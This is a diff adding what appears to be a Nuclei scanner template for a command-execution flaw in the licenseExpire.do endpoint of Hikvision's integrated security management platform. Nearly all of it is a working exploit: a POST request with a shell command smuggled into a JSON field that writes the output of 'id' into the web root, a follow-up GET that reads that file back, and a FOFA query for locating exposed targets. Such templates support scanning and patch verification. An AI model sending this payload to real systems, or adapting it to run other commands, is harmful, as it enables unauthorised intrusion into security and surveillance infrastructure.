@@ -1,0 +1,43 @@
+id: poc-bcxmqh75gx30qygm
+info:
+  name: 海康威视综合安防管理平台licenseExpire.do存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bcxmqh75gx30qygm'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bcxmqh75gx30qygm
+    fofa: header ="portal/cas/loginPage"||body="id=wiportalTitle"||body="/home/locationIndex.action?time="||body="/views/home/file/installPackage.rar"||title="综合安防管理平台"||body="portal/lida-icon/lidaicon.css"||bo
+http:
+- raw:
+  - 'POST /portal/cas/login/ajax/licenseExpire.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.1542.76 Safari/537.36
+
+    Content-Type: application/json
+
+    Content-Length: 155
+
+
+    {"type":"environment","operate":"","machines":{"id":"$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/1.txt)"}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /vms/static/1.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.1542.76 Safari/537.36
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
